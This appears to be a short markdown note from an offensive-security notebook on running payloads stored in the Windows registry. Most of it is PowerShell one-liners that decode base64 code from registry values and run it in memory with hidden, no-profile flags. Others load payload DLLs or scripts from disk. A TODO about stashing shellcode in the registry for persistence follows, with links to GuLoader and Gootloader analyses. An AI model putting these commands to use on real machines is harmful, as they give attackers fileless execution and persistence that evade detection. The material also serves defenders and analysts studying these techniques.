# Registry

TODO: Other ideas is to use registries to include shellcode and execute it.

https://blog.sonicwall.com/en-us/2022/06/guloader-a-fileless-shellcode-based-malware-in-action/

```
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c "sleep 0; IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:SOFTWARE\<registry_key>').GetValue('<registry_value_name>'))))"
```

```powershell
powershell -Command " [Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty 'HKCU:\Software\Classes\<registry_key>').b64encAssembly)); [CMD_exec.Class1]::RunCMD()"

powershell IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((get-itemproperty 'HKCU:\Software\Classes\<registry_key>').b64encPS)))

powershell -Command " [Reflection.Assembly]::Load(([System.IO.File]::ReadAllBytes('C:\path\to\payload.dll')); [CMD_exec.Class1]::RunCMD();"

powershell -Command " [Reflection.Assembly]::LoadFile('C:\path\to\payload.dll'); [CMD_exec.Class1]::RunCMD();"

powershell IEX (Get-Content C:\path\to\payload.ps1 -Raw)
```

https://az4n6.blogspot.com/2018/06/malicious-powershell-in-registry.html

adding registry persistence by spliting the shellcode hexadecimal

https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/

---
## References

### Tenouk

- [Tenouk: Windows Process & Threads - A Supplementary Note](https://www.tenouk.com/chijklsupp.html)

- [Tenouk: Registry - Part 1](https://www.tenouk.com/ModuleO.html)

- [Tenouk: Registry - Part 2](https://www.tenouk.com/ModuleO1.html)

- [Tenouk: Registry - Part 4](https://www.tenouk.com/ModuleP1.html)

- [Tenouk: Windows Registry - A Supplementary Note](https://www.tenouk.com/copregsupp.html)